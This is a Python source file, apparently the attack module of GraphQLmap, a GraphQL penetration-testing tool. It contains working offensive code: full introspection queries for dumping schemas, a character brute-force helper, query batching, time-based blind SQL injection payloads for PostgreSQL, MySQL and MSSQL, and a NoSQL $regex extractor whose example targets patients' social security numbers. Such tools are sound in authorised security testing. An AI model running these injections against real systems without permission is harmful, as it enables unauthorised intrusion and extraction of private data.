#!/usr/bin/python
from graphqlmap.utils import *
import re
import time

def display_types(URL, method, headers, use_json, proxy):
    payload = "{__schema{types{name}}}"
    r = requester(URL, method, payload, headers, use_json, proxy)
    if r is not None:
        schema = r.json()
        for names in schema['data']['__schema']['types']:
            print(names)


def dump_schema(url, method, graphversion, headers, use_json, proxy):
    """
        Dump the GraphQL schema via Instrospection

        :param headers: Headers to use
        :param url: URL of the GraphQL instance
        :param method: HTTP method to use
        :param graphversion: GraphQL version
        :return: None
    """

    if graphversion > 14:
        payload = "query+IntrospectionQuery+{++++++++++++++++__schema+{++++++++++++++++queryType+{+name+}++++++++++++++++mutationType+{+name+}++++++++++++++++subscriptionType+{+name+}++++++++++++++++types+{++++++++++++++++++++...FullType++++++++++++++++}++++++++++++++++directives+{++++++++++++++++++++name++++++++++++++++++++description++++++++++++++++++++locations++++++++++++++++++++args+{++++++++++++++++++++...InputValue++++++++++++++++++++}++++++++++++++++}++++++++++++++++}++++++++++++}++++++++++++fragment+FullType+on+__Type+{++++++++++++++++kind++++++++++++++++name++++++++++++++++description++++++++++++++++fields(includeDeprecated:+true)+{++++++++++++++++name++++++++++++++++description++++++++++++++++args+{++++++++++++++++++++...InputValue++++++++++++++++}++++++++++++++++type+{++++++++++++++++++++...TypeRef++++++++++++++++}++++++++++++++++isDeprecated++++++++++++++++deprecationReason++++++++++++++++}++++++++++++++++inputFields+{++++++++++++++++...InputValue++++++++++++++++}++++++++++++++++interfaces+{++++++++++++++++...TypeRef++++++++++++++++}++++++++++++++++enumValues(includeDeprecated:+true)+{++++++++++++++++name++++++++++++++++description++++++++++++++++isDeprecated++++++++++++++++deprecationReason++++++++++++++++}++++++++++++++++possibleTypes+{++++++++++++++++...TypeRef++++++++++++++++}++++++++++++}++++++++++++fragment+InputValue+on+__InputValue+{++++++++++++++++name++++++++++++++++description++++++++++++++++type+{+...TypeRef+}++++++++++++++++defaultValue++++++++++++}++++++++++++fragment+TypeRef+on+__Type+{++++++++++++++++kind++++++++++++++++name++++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++++ofType+{++++++++++++++++++++kind++++++++++++++++++++name++++++++++++++++++++ofType+{++++++++++++++++++++kind++++++++++++++++++++name++++++++++++++++++++ofType+{++++++++++++++++++++++++kind++++++++++++++++++++++++name++++++++++++++++++++++++ofType+{++++++++++++++++++++++++kind++++++++++++++++++++++++name++++++++++++++++++++++++ofType+{++++++++++++++++++++++++++++kind++++++++++++++++++++++++++++name++++++++++++++++++++++++++++ofType+{++++++++++++++++++++++++++++kind++++++++++++++++++++++++++++name++++++++++++++++++++++++++++}++++++++++++++++++++++++}++++++++++++++++++++++++}++++++++++++++++++++}++++++++++++++++++++}++++++++++++++++}++++++++++++++++}++++++++++++}"
    else:
        payload = "fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated:+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated:+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}"

    r = requester(url, method, payload, headers, use_json, proxy)
    schema = r.json()

    print("============= [SCHEMA] ===============")
    print("e.g: \033[92mname\033[0m[\033[94mType\033[0m]: arg (\033[93mType\033[0m!)\n")

    line = 0

    if 'data' not in schema:
        print('[+] Unable to download schema.')
        
        exit()
        
    for line, types in enumerate(schema['data']['__schema']['types']):

        if types['kind'] == "OBJECT":
            print(f"{line:02}: {types['name']}")

            if "__" not in types['name']:
                for fields in types['fields']:
                    mutation_args = ""
                    field_type = ""
                    try:
                        field_type = fields['type']['ofType']['name']
                    except Exception:
                        pass

                    print("\t\033[92m{}\033[0m[\033[94m{}\033[0m]: ".format(fields['name'], field_type), end='')

                    # add the field to the autocompleter
                    cmdlist.append(fields['name'])

                    for args in fields['args']:
                        args_name = args.get('name', '')
                        args_ttype = ""

                        try:
                            if args['type']['name'] != None:
                                args_ttype = args['type']['name']
                            else:
                                args_ttype = args['type']['ofType']['name']
                        except Exception:
                            pass

                        print("{} (\033[93m{}\033[0m!), ".format(args_name, args_ttype), end='')
                        cmdlist.append(args_name)

                        # generate mutation query as a formatted string to avoid the program crashing when args_ttype is None
                        mutation_args += f'{args_name}:{args_ttype},'
                    print("")

                    if (types['name'].lower().strip() == "mutations"):
                        mutation_args = mutation_args.replace('String', '"string"')
                        mutation_args = mutation_args.replace('Boolean', 'true')
                        mutation_args = mutation_args.replace('Int', '1')
                        mutation_args = mutation_args[:-1]
                        print("\033[95m\t(?) mutation{" + fields['name'] + "(" + mutation_args + "){ result }}\033[0m")


def exec_graphql(url, method, query, proxy, headers=None, use_json=False, only_length=0, is_batch=0):
    if headers is None:
        headers = {}
    r = requester(url, method, query, proxy, headers=headers, use_json=use_json, is_batch=is_batch)
    try:
        graphql = r.json()
        errors = graphql.get("errors")

        # handle errors in JSON data
        if errors:
            return "\033[91m" + errors[0]['message'] + "\033[0m"

        else:
            try:
                jq_data = jq(graphql)

                # handle blind injection (content length)
                if only_length:
                    return len(jq_data)

                # otherwise return the JSON content
                else:
                    output = jq(graphql)

                    # basic syntax highlighting
                    output = output.replace("{", "\033[92m{\033[0m")
                    output = output.replace("}", "\033[92m{\033[0m")
                    output = re.sub(r'"(.*?)"', r'\033[95m"\1"\033[0m', output)
                    return output

            except:
                # when the content isn't a valid JSON, return a text
                return r.text

    except Exception as e:
        return "\033[91m[!]\033[0m {}".format(str(e))


def exec_advanced(url, method, query, headers, use_json, proxy):
    # Allow a user to bruteforce character from a charset
    # e.g: {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"AdmiGRAPHQL_CHARSET\"} }"){firstName lastName id}}
    if "GRAPHQL_CHARSET" in query:
        graphql_charset = "!$%\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwxyz{|}~"
        for c in graphql_charset:
            length = exec_graphql(url, method, query.replace("GRAPHQL_CHARSET", c), proxy, headers, use_json, only_length=1)
            print(
                "[+] \033[92mQuery\033[0m: (\033[91m{}\033[0m) {}".format(length, query.replace("GRAPHQL_CHARSET", c)))


    # Allow a user to bruteforce number from a specified range
    # e.g: {doctors(options: 1, search: "{ \"email\":{ \"$regex\": \"Maxine3GRAPHQL_INCREMENT_10@yahoo.com\"} }"){id, lastName, email}}
    elif "GRAPHQL_INCREMENT_" in query:
        regex = re.compile("GRAPHQL_INCREMENT_(\d*)")
        match = regex.findall(query)
        for i in range(int(match[0])):
            pattern = "GRAPHQL_INCREMENT_" + match[0]
            length = exec_graphql(url, method, query.replace(pattern, str(i)), proxy, headers, use_json, only_length=1)
            print("[+] \033[92mQuery\033[0m: (\033[91m{}\033[0m) {}".format(length, query.replace(pattern, str(i))))


    # Allow a user to send multiple queries in a single request
    # e.g: BATCHING_3 {__schema{ types{name}}}
    elif "BATCHING_" in query:
        regex = re.compile("BATCHING_(\d*)")
        match = regex.findall(query)
        batch = int(match[0])
        query = query.replace('BATCHING_' + match[0], '')
        print(f"[+] Sending a batch of {batch} queries")
        r = requester(url, "POST", query, proxy, headers, use_json, is_batch=batch)
        output = len(r.json())
        if output == batch:
            print(f"[+] Successfully received {batch} outputs")
        else:
            print(f"[+] Backend did not sent back {batch} outputs, got {output}")


    # Otherwise execute the query and display the JSON result
    else:
        print(exec_graphql(url, method, query, proxy, headers=headers, use_json=use_json))


def blind_postgresql(url, method, proxy, headers, use_json):
    query = input("Query > ")
    payload = "1 AND pg_sleep(30) --"
    print("\033[92m[+] Started at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
    injected = (url.format(query)).replace("BLIND_PLACEHOLDER", payload)
    requester(url, method, injected, proxy, headers, use_json)
    print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))


def blind_mysql(url, method, proxy, headers, use_json):
    query = input("Query > ")
    payload = "'-SLEEP(30); #"
    print("\033[92m[+] Started at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
    injected = (url.format(query)).replace("BLIND_PLACEHOLDER", payload)
    requester(url, method, injected, proxy, headers, use_json)
    print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))


def blind_mssql(url, method, proxy, headers, use_json):
    query = input("Query > ")
    payload = "'; WAITFOR DELAY '00:00:30';"
    print("\033[92m[+] Started at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
    injected = (url.format(query)).replace("BLIND_PLACEHOLDER", payload)
    requester(url, method, injected, proxy, headers, use_json)
    print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))


def blind_nosql(url, method, proxy, headers, use_json):
    # Query - include BLIND_PLACEHOLDER. e.g. {doctors(options: "{\"\"patients.ssn\":1}", search: "{ \"patients.ssn\": { \"$regex\": \"^BLIND_PLACEHOLDER\"}, \"lastName\":\"Admin\" , \"firstName\":\"Admin\" }"){id, firstName}}
    query = input("Query > ")
    # Check the input (known value) against the data found - e.g. 5d089c51dcab2d0032fdd08d
    check = input("Check > ")
    # Charset to use - Default abcdefghijklmnopqrstuvwxyz1234567890
    charset = input("Charset > ")
    if(not charset):
        charset = "abcdefghijklmnopqrstuvwxyz1234567890"
    data = ""
    _break = False
    
    while (_break == False):
        old_data = data
        for c in charset:
            injected = query.replace("BLIND_PLACEHOLDER", data + c)
            r = requester(url, method, injected, proxy, headers, use_json)
            if check in r.text:
                data += c
                # display data and update the current line
                print("\r\033[92m[+] Data found:\033[0m {}".format(data), end='', flush=False)
        # Stop if no character is found
        if(old_data == data):  
            _break = True
    # force a line return to clear the screen after the data trick
    print("")
